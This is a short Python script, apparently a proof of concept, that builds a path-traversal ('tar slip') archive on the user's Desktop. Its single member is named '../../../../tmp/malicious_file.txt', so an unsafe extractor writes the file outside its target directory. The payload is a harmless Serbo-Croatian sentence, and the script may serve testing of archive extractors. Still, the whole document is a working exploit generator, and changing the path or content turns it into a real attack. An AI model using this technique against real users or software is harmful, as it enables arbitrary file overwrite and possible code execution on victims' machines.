import os
import tarfile

content = b"Ovo je maliciozni sadrzaj."

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
malicious_tar_path = os.path.join(desktop_path, "malicious.tar")

malicious_content_path = 'malicious_content.txt'
with open(malicious_content_path, 'wb') as f:
    f.write(content)

with tarfile.open(malicious_tar_path, 'w') as tar:
    tarinfo = tarfile.TarInfo(name='../../../../tmp/malicious_file.txt')
    tarinfo.size = len(content)
    with open(malicious_content_path, 'rb') as f:
        tar.addfile(tarinfo, fileobj=f)

os.remove(malicious_content_path)

print(f"Maliciozni tar arhiv kreiran i sačuvan na: {malicious_tar_path}")
